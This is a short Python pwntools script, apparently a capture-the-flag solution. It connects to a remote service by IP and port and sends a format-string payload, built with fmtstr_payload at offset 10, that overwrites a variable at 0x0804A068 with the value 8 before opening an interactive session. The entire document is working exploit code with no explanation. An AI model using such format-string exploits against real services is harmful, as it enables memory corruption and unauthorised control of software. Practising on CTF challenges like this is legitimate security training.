from pwn import *
context.log_level = 'debug'

p="./elf"

pwnme=0x0804A068  
context.binary=p
#io=process(p)
io=remote("111.198.29.45",57010)
io.recvuntil("please tell me your name:")
io.sendline("aa")
payload = fmtstr_payload(10, {pwnme:8})  
io.recvuntil("leave your message please:")
io.sendline(payload)
io.interactive()
